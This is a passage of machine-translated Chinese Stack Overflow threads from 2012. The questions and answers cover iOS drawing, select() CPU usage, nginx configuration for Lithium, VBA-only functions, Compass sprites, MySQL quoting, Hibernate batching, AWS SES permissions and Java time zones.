
    [self touchesMoved:touches withEvent:event];
}

-(void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event
{

    UITouch *touch  = [touches anyObject];

    previousPoint2  = previousPoint1;
    previousPoint1  = [touch previousLocationInView:self];
    currentPoint    = [touch locationInView:self];

    // calculate mid point
    CGPoint mid1    = midPoint(previousPoint1, previousPoint2); 
    CGPoint mid2    = midPoint(currentPoint, previousPoint1);

    CGMutablePathRef path = CGPathCreateMutable();
    CGPathMoveToPoint(path, NULL, mid1.x, mid1.y);
    CGPathAddQuadCurveToPoint(path, NULL, previousPoint1.x, previousPoint1.y, mid2.x, mid2.y);
    CGRect bounds = CGPathGetBoundingBox(path);
    CGPathRelease(path);

    CGRect drawBox = bounds;

    //Pad our values so the bounding box respects our line width
    drawBox.origin.x        -= self.lineWidth * 2;
    drawBox.origin.y        -= self.lineWidth * 2;
    drawBox.size.width      += self.lineWidth * 4;
    drawBox.size.height     += self.lineWidth * 4;

    UIGraphicsBeginImageContext(drawBox.size);
    [self.layer renderInContext:UIGraphicsGetCurrentContext()];
    curImage = UIGraphicsGetImageFromCurrentImageContext();
    [curImage retain];
    UIGraphicsEndImageContext();

   [self setNeedsDisplayInRect:drawBox];

} 
```

当我实现这个时，我得到了 dot dot dot 的绘画效果......

见下图（没有任何阴影或浮雕效果）。如果您对如何添加这些效果有任何想法，请给我一些建议。我该如何解决这个问题？

![在此处输入图像描述](../Images/22f1d332f3491f8ab3696f9a888dd964.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T12:49:23.193

看来您正在创建数百甚至数千个单独的路径，每个 drawRect 上都有一个。您确实可以使用这些方法将它们弄平，`[self.layer renderInContext]`但我认为这不是解决问题的好方法。相反，我认为您想要做的是创建一个 UIBezierPath 来跟踪手指，将路径附加到该手指并将 UIBezierPath 绘制到屏幕上。如果您创建两个图层（或视图），您可以将最上面的一个（透明）设置为“绘制”。当用户抬起手指时，您将整个 UIBezierPath 渲染到第二层（连同之前绘制的数据）并创建一个新的 UIBezierPath 来绘制下一个手指跟踪。这样，当您跟踪某人的手指时，您只需更新一层（最上面一层）。这将有助于防止设备减慢绘制过多路径的速度。

虽然，我会说，您当前的方法确实会产生看起来很酷的“3D”效果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-25T04:50:44.693

阴影是在边框上创建的，您正在绘制小段线，这会产生这种效果。您需要创建一条路径，然后对其进行一次描边。此代码可能会对您有所帮助:)

```
for (int i=0; i<[currentPath count]; i++) 
{
    CGPoint mid1 = [[self midPoint:[currentPath objectAtIndex:i+1]  :[currentPath objectAtIndex:i]] CGPointValue]; 
    CGPoint mid2 = [[self midPoint:[currentPath objectAtIndex:i+2] :[currentPath objectAtIndex:i+1]] CGPointValue];
    CGContextMoveToPoint(context, mid1.x, mid1.y);
    CGContextAddQuadCurveToPoint(context, [[currentPath objectAtIndex:i+1] CGPointValue].x, [[currentPath objectAtIndex:i+1] CGPointValue].y, mid2.x, mid2.y); 
    CGContextSetShadow(context, CGSizeMake(-2, -2), 3);

    CGContextSetLineCap(context, kCGLineCapRound);
    CGContextSetStrokeColorWithColor(context,[color CGColor]);              
    CGContextSetLineWidth(context, linewidth);              

    i+=2;
}
CGContextStrokePath(context); 
```

试试这种方式..这个解决方案可能会解决你的问题..首先创建你的路径，在它完全创建后，抚摸它。发生这种情况是因为在您描边的每条小线处，因此创建的阴影在其边界上制作了一个点，因此您得到了这种效果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:58:10.220

我不确定浮雕，但是如果您想要对逐渐更新的绘图应用阴影，那么一个不错的方法是使用[CALayers (link to a tutorial)](http://www.raywenderlich.com/2502/introduction-to-calayers-tutorial)。基本上，您的渐进式绘图将更新透明图像（不尝试在该图像中绘制任何阴影），并且该图像将被配置为通过其 CALayer 以投影方式显示。

# c - select() 系统调用占用 CPU

> ID：11155901
> 
> 赞同：2
> 
> 时间：2012-06-22T12:10:52.630
> 
> 标签：c, performance, embedded-linux, strace

我编写了一个接受不同远程客户端的应用程序，并基于`select()`将作业分配给不同的处理程序。我注意到在一个运行 ARM926EJ-S 和内核 2.6.33-rc4 的平台上，应用程序使用了大量的 CPU！*这是通过使用strace -c*运行我的应用程序 30 秒可以看到的：

```
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 98.47    3.680000      204444        18           select
... 
```

但是，如果我从远程客户端连续向应用程序发送数据，则 select 使用的 CPU 会少得多！

```
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 44.69    0.340278         175      1945           gettimeofday
 40.71    0.310000       25833        12           select
  3.94    0.030000       30000         1           fsync
... 
```

我想知道是否`select()`在繁忙的等待中实施。但是，在较旧的平台上，运行 MIPS 处理器和 2.6.30.10 Linux 内核并没有出现这个问题，尽管我应该交叉编译 strace 来确认......！而且由于数据“很少”发送，我大多处于最坏的情况！

我想知道问题可能来自哪里！C 库？Linux内核？另一方面，我不确定编写多线程应用程序是否会因为`pthread`关键部分...而导致更好的性能？

我在网上看了两篇有趣的文章：

*   [*“现实负载下 Internet 服务器的可扩展内核性能”*](http://kdb.snu.ac.kr/~tsangbi/References/network/1998%20Scalable%20kernel%20performance%20for%20internet%20servers%20under%20realistic%20loads.pdf)
*   [*“用于 UNIX 的可扩展且显式的事件传递机制”*](http://static.usenix.org/event/usenix99/full_papers/banga/banga_html/final2.html)

不幸的是，它们已经很老了（从 '98/'99 开始）我想知道其他人是否遇到过这种问题，或者您是否有任何其他建议来提高性能或指出真正的问题？

**编辑**：
我注意到我的应用程序使用 CPU 连接的客户端越多，尽管客户端不发送任何数据！由于大部分时间都花在了select上，我认为select本身会消耗更多的CPU！我可以在 ARM 下使用哪些其他免费工具来分析我的应用程序并指出问题？Valgrind 在 ARM9 上（还）不工作......

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-22T12:16:40.743

`strace -c`不测量花费的 CPU 时间，而是测量系统调用中花费的总时间。请参阅其联机帮助页：

> 计算每个系统调用的时间、调用和错误，并在程序退出时报告摘要。

因此，如果您`select`在低负载下的百分比不高，那实际上会很糟糕！

您可以使用`perf`（`linux-tools`debian/ubuntu 上的 package）来衡量整体性能，包括内核代码。

# c# - 在这种情况下如何跟踪文件？C＃

> ID：11155904
> 
> 赞同：-1
> 
> 时间：2012-06-22T12:11:07.677
> 
> 标签：c#, .net

我想做一个软件，但我真的不知道如何跟踪这些事情。

这个想法是这样的：

1.  我选择一个文件夹
2.  给出最大行数（例如 300000）
3.  给一个线/包（例如8000）

软件必须这样做。转到文件夹中的每个文件（我设法完成它直到这里，大声笑）打开每个文件并保存他的行。如果 file1.txt 有例如 3000 行，将它们保存到一个文件中，转到下一个文件，如果第二个文件有 2000 行，也保存它，直到我有 8000 行到一个包中。找到 8000 行后，保存文件，如“packet1.txt”，转到下一个文件，依此类推……直到在这种情况下，所有行都达到最大行数（300 000）。

这是代码：

```
if (!path(folderBrowserDialog1.SelectedPath))
    MessageBox.Show("Please select a folder!");
else if ((textBox1.Text != "") && (textBox2.Text != "") && (textBox4.Text!=""))
{
    folder = folderBrowserDialog1.SelectedPath;
    maxlinks = int.Parse(textBox1.Text);
    packetlink = int.Parse(textBox2.Text);
    //  apikey = textBox4.Text;
    foreach (string file in Directory.GetFiles(folder))
    {

    }
}
else
    MessageBox.Show("Please check your input!"); 
```

PS：路径功能只检查目录是否被选中。

有人可以给出一些想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:23:19.120

尝试这个：

[http://msdn.microsoft.com/en-us/library/aa287535(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/aa287535(v=vs.71).aspx)

所以

```
if (!path(folderBrowserDialog1.SelectedPath))
    MessageBox.Show("Please select a folder!");
else if ((textBox1.Text != "") && (textBox2.Text != "") && (textBox4.Text!=""))
{
    folder = folderBrowserDialog1.SelectedPath;
    maxlinks = int.Parse(textBox1.Text);
    packetlink = int.Parse(textBox2.Text);
    //  apikey = textBox4.Text;
    foreach (string file in Directory.GetFiles(folder))
    {
        int counter = 0;
        string line;

        // Read the file and display it line by line.
        System.IO.StreamReader file = 
           new System.IO.StreamReader(file);
        while((line = file.ReadLine()) != null && counter < 30000)
        {
            Console.WriteLine (line);
            counter++;
        }

        file.Close();
    }

}
else
{
    MessageBox.Show("Please check your input!");
} 
```

# javascript - 删除 contenteditable 属性时删除的文本空格

> ID：11155909
> 
> 赞同：0
> 
> 时间：2012-06-22T12:11:27.270
> 
> 标签：javascript, jquery, html

我有一个`div`和它的孩子`span`。我用 div`click`和`dblclick`.

在`dblclick`我申请`contenteditable`和`span`我`click`正在删除

`contenteditable`从`span`. 现在我的问题是当我在

`span`之后，当我`click`在它上面删除`contenteditable`属性时，所有文本

空格被删除，所有文本都出现在一行中。我创建了一个[Fiddle 示例](http://jsfiddle.net/FDYGn/1/)。帮帮我

请？

**编辑**

`dblclick`在 div 上并在小提琴示例中输入以下文本，然后`click`在它上面

```
(ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-06-22T12:19:42.303

添加`style="Text-wrap:pre;"`到您的 div

# nginx - 在 Nginx 上配置锂

> ID：11155910
> 
> 赞同：1
> 
> 时间：2012-06-22T12:11:42.507
> 
> 标签：nginx, lithium

我想在 nginx 服务器上部署[锂](http://lithify.me)，但是只为 Apache 和 IIS 提供了配置。过去我已经成功地为各种应用程序编写了几个 nginx 服务器配置，但我正在努力解决这个问题。

已经在 nginx 和锂论坛上问过这个问题，没有运气。

这是我迄今为止所做的最好的。

```
root /var/servers/my_app/app/webroot;

location / {
    index index.php;
    try_files $uri $uri/ index.php;
}
location ~ \.php {
            fastcgi_pass unix:/tmp/php.socket;
            fastcgi_index index.php;
            include fastcgi_params;
            fastcgi_param SCRIPT_FILENAME /var/servers/my_app/$fastcgi_script_name;
            fastcgi_param PATH_INFO $fastcgi_script_name;
    } 
```

问题出在 / （根页面）上，每个链接都在 index.php 前面添加，例如，而不是

```
www.example.com/something 
```

我明白了

```
www.example.com/index.php/something 
```

不确定这是否与 nginx 配置相关，或者更确切地说，锂在无法检测到 Apache/IIS 环境时会这样做。无论哪种方式，我都无法解决。

另一件事是，当我访问“www.example.com/test”（通过直接 URL 输入）时，页面会正确呈现，但是“www.example.com/test/”（带有斜杠）和“www.example. com/test/anything_here" 已损坏 - 所有链接都附加到当前 URL，例如按下相同的链接会创建以下内容：

```
www.example.com/test/
www.example.com/test/test
www.example.com/test/test/test 
```

**编辑：更新的配置** （很抱歉延迟编辑，但我仍然卡住，最近重新开始解决这个问题）

```
 root /var/server/my_app/app/webroot/;

    index index.php index.html;
    try_files $uri $uri/ /index.php?$args;

    location ~ \.php {
            fastcgi_pass unix:/tmp/php.socket;
            fastcgi_index index.php;
            include fastcgi_params;
            fastcgi_param SCRIPT_FILENAME /var/servers/my_app/$fastcgi_script_name;
            fastcgi_param PATH_INFO $fastcgi_script_name;
    }

    location ~/\.ht {
            deny all;
    } 
```

}

正如我在评论中提到的，这会导致所有链接都包含 index.php，它看起来像：

```
www.example.com/index.php/something
www.example.com/index.php/stylesheet.css 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T14:35:39.720

我认为你的问题是`try_files`不应该在一个`location`块内。

尝试此处显示的配置：http: [//li3.me/docs/manual/configuration/servers/nginx.wiki](http://li3.me/docs/manual/configuration/servers/nginx.wiki)

我帮助定义了它，并一直在本地和生产中使用它。它不应该导致您报告的任何问题。

复制如下：

```
server {
        listen   IP_ADDRESS_HERE:80;
        server_name DOMAIN.COM;

        root   /var/www/DOMAIN.COM/webroot/;
        access_log /var/log/DOMAIN.com/access.log;
        error_log /var/log/DOMAIN.com/error.log warn;

        index  index.php index.html;

        try_files $uri $uri/ /index.php?$args;

        location ~ \.php$
        {
                fastcgi_pass 127.0.0.1:9000;
                fastcgi_index  index.php;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                include /etc/nginx/fastcgi_params;
        }
        location ~ /\.ht {
                deny all;
        }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-27T12:22:06.563

我怀疑问题是锂依赖于一些环境变量，在这种情况下 - 链接生成，它使用 PHP_SELF，这恰好是不正确的。

解决方案：

```
fastcgi_param PATH_INFO $fastcgi_path_info; 
```

而不是以前不正确的：

```
fastcgi_param PATH_INFO $fastcgi_script_name; 
```

所以最终配置：

```
root /var/server/my_app/app/webroot/;

index index.php index.html;
try_files $uri $uri/ /index.php?$args;

location ~ \.php {
        fastcgi_pass unix:/tmp/php.socket;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME /var/servers/my_app$fastcgi_script_name;
        fastcgi_param PATH_INFO $fastcgi_path_info;
}

location ~/\.ht {
        deny all;
} 
```

感谢 rmarscher 和 mehlah @ lithum 论坛。

# excel - 如何使 VBA 功能“仅限 VBA”并将其禁用为 UDF

> ID：11155912
> 
> 赞同：8
> 
> 时间：2012-06-22T12:11:52.503
> 
> 标签：excel, vba, excel-2007, user-defined-functions

我正在编写一个 VBA 函数，我希望它可以在同一文档中的其他 VBA 模块中公开使用，但是我不希望它作为 UDF（用户定义的函数）提供。

如果我使用公共访问修饰符，那么我的函数也可以作为 UDF 公式使用，可以从工作簿中的单元格调用。我不想要这个。

是否有访问修饰符或其他方式可以帮助我获得这种“仅限 VBA”的行为？

亲切的问候

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2016-12-13T21:26:11.857

如果您`Option Private Module`在该函数出现的模块中使用，则该函数可以声明为`Public`并在您的 VBA 项目中的任何其他模块中使用，但其他应用程序或项目（包括 Excel 本身）将无法访问该函数。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-22T16:51:15.957

如果在 Excel 中使用，这将返回 #VALUE 错误。

```
Function VBAOnly() As Variant

    If TypeName(Application.Caller) <> "Range" Then
        VBAOnly = 1 'or some other return value
    Else
        VBAOnly = CVErr(xlErrValue)
    End If

End Function 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-06-29T11:27:27.193

而不是写 a `Function`，写 a `Sub`，然后通过`ByRef`参数设置返回值。这样，您的函数将对 Excel 不可见（通过 Alt F8 或开发人员选项卡 > 宏除外），并且不会出现在 Excel 的智能感知中。

代替

```
Function Add(Num1 As Double, Num2 As Double)
    Add = Num1 + Num2
End Function 
```

利用

```
Sub AddInvisible(ByRef Result As Double, Num1 As Double, Num2 As Double)
    Result = Num1 + Num2
End Sub 
```

笔记

1.  这`ByRef`不是绝对必要的（因为参数在 VBA 中默认通过引用），但它可以作为一个有用的提示，`Result`携带返回值。
2.  您需要对代码进行必要的更改，例如：

    `z = Add(x,y)`

会成为

`AddInvisible z,x,y`

如下所示：

```
Sub DemoAddInvisible()

    Dim Num1 As Double
    Dim Num2 As Double
    Dim Result As Double 'Result initialises to 0

    Num1 = 1
    Num2 = 2
    AddInvisible Result, Num1, Num2

    MsgBox Result ' See that Result has become 3

End Sub 
```

所有这些的缺点是新代码有点难以理解。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-07-22T01:19:18.403

答案之间有点混乱，所以这里有一个更全面的解释：

*从技术上讲...*如果输入了确切的公式，则可以调用标准 VBA 模块中的所有函数。甚至公式在`Private Functions`里面`Private Modules`

例子

```
Option Private Module
Private Function hiddenEverythingExample() As String
    hiddenEverythingExample= "NOPE!!!"
End Function 
```

如果单元格有，仍将返回一个值`=hiddenEverythingExample()`

[![在此处输入图像描述](../Images/208e746527d0d72975211c29216668e3.png)](https://i.stack.imgur.com/Vd7oL.png)

但是，我相信 OP 的目标是**避免让 itellisense 在 Excel 公式栏中填充这些函数。**

我最常用的方法是为所有 VBA-Only 函数创建一个特定`Option Private Module`的模块并放入模块定义（函数上方的区域）。

[![在此处输入图像描述](../Images/567e5bf186ad3d71244549ecb30eb972.png)](https://i.stack.imgur.com/vb7Dm.png)

这确保了该模块中的所有功能都不会出现在 itellisense 中，但仍然可以与 itellisense 一起被其他模块访问。

定义 as`Private Function`也可以完成此操作，但是该功能的范围仅限于该模块，这可能是也可能不是要求。

请注意，YowE3K 推断一个函数必须是`Private Function` **AND** `Option Private Module`，但只有一个**OR**是消除 itellisense 所必需的。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-06-22T20:12:39.060

使用`Private`修饰符应该只允许在函数所在的模块中执行。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-06-22T13:30:27.650

传递一个参数，该参数仅在给定“魔术*”值时才允许该函数运行。

示例 - 这将给出错误`#NAME!`，除非您知道*密钥*是什么：

```
Function VBAOnly(key As Long)

If key <> 12345 Then
    VBAOnly = CVErr(xlErrName)
    Exit Function
End If

VBAOnly = True

End Function 
```

# css - 指南针精灵背景位置不是我想要的

> ID：11155913
> 
> 赞同：13
> 
> 时间：2012-06-22T12:11:52.737
> 
> 标签：css, sass, compass-sass

我是第一次使用 Compass spriting。我想让图标图像（大小都略有不同）居中。像附图一样

![在此处输入图像描述](../Images/da473f66329c2b8b0c9b4ae43ddd29f1.png)

我正在使用这个设置

```
$icons-spacing:40px;
@import "icons/*.png";
@include all-icons-sprites; 
```

我得到的CSS是（例如）

```
.icons-adventure {
  background-position: 0 -608px;
} 
```

这不是我所要求的。我想从顶部和左侧提供更多间距。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-18T22:39:50.233

我为这个问题找到了两种解决方法，但都不完美：

1.  您可以简单地使用必要的填充将图标保存在图像编辑器中 - 如果您只想在一个地方使用它，它可以工作，否则您必须创建重复项（这就是为什么这并不总是有效的原因）。
2.  其他解决方案是使用伪元素。假设是您要添加背景的元素，并且您已将图标放在图标文件夹中：

> ```
> @import "icons/*.png";
> 
> el { 
>   position: relative; 
> }
> 
> el:after { 
>   content: ""; 
>   position: absolute; 
>   left: 50%; 
>   top: 50%; 
>   @include icons-sprite(some_icon); 
>   margin-top: - round(icons-sprite-height(some_icon) / 2); 
>   margin-left: - round(icons-sprite-width(some_icon) / 2);    
> } 
> ```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-14T19:13:19.277

您可能想查看这个 Github Gist：[https](https://gist.github.com/adamlogic/3577147) : //gist.github.com/adamlogic/3577147，它帮助我解决了过去的精灵问题，也更好地了解了 Compass 中精灵的工作原理。

您可能特别感兴趣的是作者提到以下内容的部分：（粘贴在此处以防删除要点）

> “我通过定义我自己的（精灵）mixin 更进一步。”

```
$spritemap-spacing: 50px
@import "spritemap/*.png"

=background-sprite($name, $repeat: no-repeat, $offset-x: 0, $offset-y: 0)
  background-image: $spritemap-sprites
  background-repeat: $repeat
  +sprite-background-position($spritemap-sprites, $name, $offset-x, $offset-y)

  // if no offsets given, set the dimensions of the element to match the image
  @if $offset-x == 0 and $offset-y == 0
    +sprite-dimensions($spritemap-sprites, $name) 
```

> “以及我如何使用它”

```
// simplest case; sets the background image and dimensions of the element
h3
  +background-sprite(ribbonfull)

// custom offset; does not set the dimensions of the element
h2
  +background-sprite(ribbonend, no-repeat, 3px, 22px)

// repeating backgrounds are possible, too
#positions
  +background-sprite(doubleline, repeat-x, 0, 45px) 
```

而且，作者生成的 CSS：

```
h3 {
  background-image: url('/images/spritemap-sb826ca2aba.png');
  background-repeat: no-repeat;
  background-position: 0 -405px;
  height: 29px;
  width: 295px; }

h2 {
  background-image: url('/images/spritemap-sb826ca2aba.png');
  background-repeat: no-repeat;
  background-position: 3px -296px; }

#positions {
  background-image: url('/images/spritemap-sb826ca2aba.png');
  background-repeat: repeat-x;
  background-position: 0 -751px; } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T21:24:07.653

`$icons-spacing`定义在生成的精灵图中分隔每个图像的像素数。我相信你想调整`$icons-position`哪些调整（偏移）生成的`background-position`样式

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-14T18:00:01.997

首先，一个好问题...

当您在 CSS 中提供精灵时，您将能够使用`.image-name`. 这就是指南针精灵的工作方式。您的图像将附加到一个大精灵图像中，所有不规则图像将以网格方式组合在一起。

尽管`$icons-spacing`使您能够为网格提供一些填充，但在这种情况下放置它并不容易。因此，继续生成生成的内容，我们将执行以下操作。

因此，如果您想要类似图片的内容，则需要将元素居中，该元素具有 Compass 生成的类。

现在说，你有`adventure.png`它并且它已经生成了这个类：

```
.icons-adventure {
    background-position: 0 -608px;
} 
```

现在，如果你想让它居中，你可以这样做。

```
<div class="border">
    <i class="icons-adventure"></i>
</div> 
```

对于`border`课程，请提供填充。所以，我的意思是，你已经`.border`将`.icons-adventure`. 现在，你需要给它一些填充和宽度。

```
.border {padding: 15px; width: 40px;} 
```

在这里，不需要高度，因为高度是自动处理的。让我来一个小提琴给你一个清楚的解释。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-08-06T06:27:37.220

如果您使用的是 Bootstrap 3，只需使用以下代码，它简单干净，

SASS 文件

```
@import "compass";
$home-spacing : 10px;
$home-sprite-dimensions : true;
@import "web/images/home/*.png";
@include all-home-sprites; 
```

在 HTML/Slim 文件中，我只使用`center-block`Twitter Bootstrap 3 提供的，我的 HTML 助手，

```
=content_tag('div','',:class=>'home-save_money center-block') 
```

基本上它只是将图像居中对齐到 div 的中心，上面的所有答案都使用一些自定义 Mixins 或 hack。

PS：即使你不使用 twitter bootstrap，只要使用下面的 CSS，就可以了，

```
display: block;
margin-left: auto;
margin-right: auto; 
```

我希望这可以帮助别人，

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-03-28T16:26:58.953

如果您知道图标的大小，您可以为所有图标设置默认高度，并为单个图标提供（默认高度 - 图标高度）/2 的垂直偏移，并以水平居中放置：

```
$sprite-spacing: 50px;
@import "compass/utilities/sprites";
@import "sprite/*.png";
@include all-sprite-sprites;
$sprite: sprite-map("sprite/*.png", $spacing: 50px);

@include sprite-sprite(myicon);
@include sprite-background-position($sprite, myicon, center, 12px); 
```

# mysql - phpmyadmin sql撇号不起作用

> ID：11155915
> 
> 赞同：0
> 
> 时间：2012-06-22T12:11:55.567
> 
> 标签：mysql, phpmyadmin

嘿伙计们希望你能帮助我

不确定我是否总是遇到这个问题，或者它是否是新的，在 sql 选项卡的 phpmyadmin 中，它识别的撇号与我输入的不同，例如，

当我输入时，它是

```
SELECT * FROM 'table' 
```

这给了我一个错误，所以我不得不喜欢复制/粘贴一些预建查询的反逗号，这样它看起来像

```
SELECT * FROM `table` 
```

看看撇号有什么不同？有什么办法可以解决这个问题？

另外，我在网上看到了很多查询，我认为即使是我从 php 调用的查询也不需要表名带有撇号。但是当在 phpmyadmin 中编写它时，我可以在没有表名的情况下进行查询吗？

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T12:19:06.430

***在 MYSQL 中，`table`是一个保留关键字。如果要在查询中使用mysql中的保留关键字，则必须将它们括在反引号（`）中。***

作为`table`保留关键字，您查询***应该是***

```
SELECT * FROM `table` 
```

关于**单引号 (')**，在 mysql 中，它表示字符串值。

```
SELECT *, 'table' FROM `table`; 
```

## [演示](http://sqlfiddle.com/#!2/416e4/1)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T12:16:59.640

您只需要在表名与保留字冲突时引用它们。

还：

```
` = Grave accent, or (because someone needed to invent a word) backtick
' = Apostrophe, or straight single quote 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T12:14:00.460

您不需要在表名上加上撇号。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-22T12:23:52.690

如果您的表/字段名称是保留字，则应使用 `，例如：

```
SELECT `distinct`, myfields FROM mytable 
```

请注意， distinct 是一个 sql 命令，因此您需要将 `.

```
SELECT * FROM `table` 
```

`table`这里应该在`里面。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-22T12:15:23.413

有两个不同的字符，反引号和单引号。表名和列名可以用反引号括起来，字符串可以用引号括起来。没有什么可以修复的：D

# hibernate - 使用 Hibernate 在 CSV 文件中持久化 POJO

> ID：11155920
> 
> 赞同：0
> 
> 时间：2012-06-22T12:12:24.610
> 
> 标签：hibernate, csv, persistence, oracle11g

嘻嘻，

我正在做一个项目，我应该将大量 POJO 文件保存到 Oracle 数据库中。问题是 Hibernate 为每个 POJO 创建一个新的插入 JDBC 请求。当持久化超过 45.000.000 个对象时，这将需要很长时间。我必须将数据保存到数据库中，这些数据将分布在 15 个不同的表中。所以对于每组数据，我必须做 15 条不同的插入语句。当我必须持久化 3.000.000 个数据集时，需要 45.000.000 个插入语句。

当我和一位同事讨论这个问题时，他建议使用 CSV 文件，而不是使用插入语句插入每个 POJO。现在我想知道，有没有一种简单的方法可以让 Hibernate 为每个表写入一个 CSV 文件？

或者也许有人知道更好的解决方案？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-06-22T13:53:13.840

建议您阅读有关批处理的休眠章节：http: [//docs.jboss.org/hibernate/orm/3.3/reference/en/html/batch.html](http://docs.jboss.org/hibernate/orm/3.3/reference/en/html/batch.html)

# java - 无法从 Java 中的 Amazon EC2 服务器发送电子邮件

> ID：11155921
> 
> 赞同：11
> 
> 时间：2012-06-22T12:12:25.030
> 
> 标签：java, email, amazon-ec2, amazon-web-services

尝试使用 java 代码从 Amazon EC2 服务器发送邮件但遇到异常，例如 -

```
Exception in thread "main" Status Code: 403, AWS Request ID: 3e9319ec-bc62-11e1-b2ea-6bde1b4f192c, AWS Error Code: AccessDenied, AWS Error Message: User: arn:aws:iam::696355342546:user/brandzter is not authorized to perform: ses:SendEmail
at com.amazonaws.http.AmazonHttpClient.handleErrorResponse(AmazonHttpClient.java:500)
at com.amazonaws.http.AmazonHttpClient.executeHelper(AmazonHttpClient.java:262)
at com.amazonaws.http.AmazonHttpClient.execute(AmazonHttpClient.java:166)
at com.amazonaws.services.simpleemail.AmazonSimpleEmailServiceClient.invoke(AmazonSimpleEmailServiceClient.java:447)
at com.amazonaws.services.simpleemail.AmazonSimpleEmailServiceClient.sendEmail(AmazonSimpleEmailServiceClient.java:242)
at brandzter.util.SESExample.SendMail(SESExample.java:46)
at brandzter.util.SESExample.<init>(SESExample.java:31)
at brandzter.util.SESExample.main(SESExample.java:52) 
```

Java 结果：1

我的凭证没问题，不知道为什么我无法在这里发送电子邮件。我需要配置/更新服务器中的任何设置吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-02T16:19:15.997

您的用户无权在身份和访问管理 (IAM) 中向 SES 发送电子邮件。

错误 403 是指 HTTP 代码 403 Unauthorized。

最后的错误告诉你你缺少什么权限。

> arn:aws:iam::696355342546:user/brandzter 无权执行：ses:SendEmail

或者，您的 AWS 账户可能没有注册简单电子邮件服务，但我怀疑这是问题所在。

您可以使用以下策略向 IAM 添加仅允许 sendEmail 操作的组：

```
{
  "Statement": [
    {
      "Action": [
        "ses:SendEmail"
      ],
      "Effect": "Allow",
      "Resource": [
        "*"
      ]
    }
  ]
} 
```

或者，您可以给它一个允许它在 SES 上执行任何操作的策略：

```
{
  "Statement": [
    {
      "Action": [
        "ses:*"
      ],
      "Effect": "Allow",
      "Resource": [
        "*"
      ]
    }
  ]
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2015-05-13T20:35:03.250

在我的情况下，我去了 IAm 控制台，选择我的用户并附加策略 AmazonSESFullAccess

# sql-server - 链接服务器连接在哪里执行计算？

> ID：11155925
> 
> 赞同：0
> 
> 时间：2012-06-22T12:12:50.807
> 
> 标签：sql-server, join

假设我有两个 SQL Server 数据库在不同的机器上运行，将它们`MachineA`称为`MachineB`.

如果我执行如下查询

```
SELECT
    [Store].[Name] AS [Store Name],
    [Employee].[Name] AS [Employee Name],
    SUM([Sale].[Amount]) AS [Total Sales]
FROM [MachineA].[DatabaseA].[dbo].[Sales] AS [Sale]
INNER JOIN [MachineB].[DatabaseB].[dbo].[Employees] AS [Employee]
ON [Sale].[EmployeeId] = [Employee].[EmployeeId]
INNER JOIN [MachineB].[DatabaseB].[dbo].[Stores] AS [Store]
ON [Employee].[StoreId] = [Store].[StoreId]
GROUP BY [Store].[Name], [Employee].[Name] 
```

我们假设查询在哪里运行`MachineA`，实际在哪里执行工作？是否`MachineA`执行所有读取并将行发送到`MachineB`for `JOIN`ing？还是这里发生了更复杂的事情？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:16:56.630

查询优化器将根据链接服务器驱动程序的能力选择最佳计划。

# java - 如何获取指定 ISO 国家代码的时区 ID？

> ID：11155929
> 
> 赞同：5
> 
> 时间：2012-06-22T12:13:15.223
> 
> 标签：java, timezone

我有一个要求，我必须将时区从 UTC 转换为特定时区，反之亦然，同时考虑到夏令时。我正在为此使用`java.util.TimeZone`课程。现在，问题是有数百个时区 ID 无法向用户显示。

作为现在的解决方法，我们决定首先列出国家/地区列表并列出所选国家/地区的时区。我无法获得`TimeZone`ISO[国家代码](http://en.wikipedia.org/wiki/ISO_3166-1#Officially_assigned_code_elements)。

这是我目前用来转换时区的代码，

```
Timestamp convertedTime = null;
try{
System.out.println("timezone: "+timeZone +", timestamp: "+timeStamp);
Locale locale = Locale.ENGLISH;
        TimeZone destTimeZone = TimeZone.getTimeZone(timeZone);// TimeZone.getDefault();
        System.out.println("Source timezone: "+destTimeZone);
        DateFormat formatter = DateFormat.getDateTimeInstance(
                    DateFormat.DEFAULT,
                    DateFormat.DEFAULT,
                    locale);
        formatter.setTimeZone(destTimeZone);
        Date date = new Date(timeStamp.getTime());
        System.out.println(formatter.format(date));
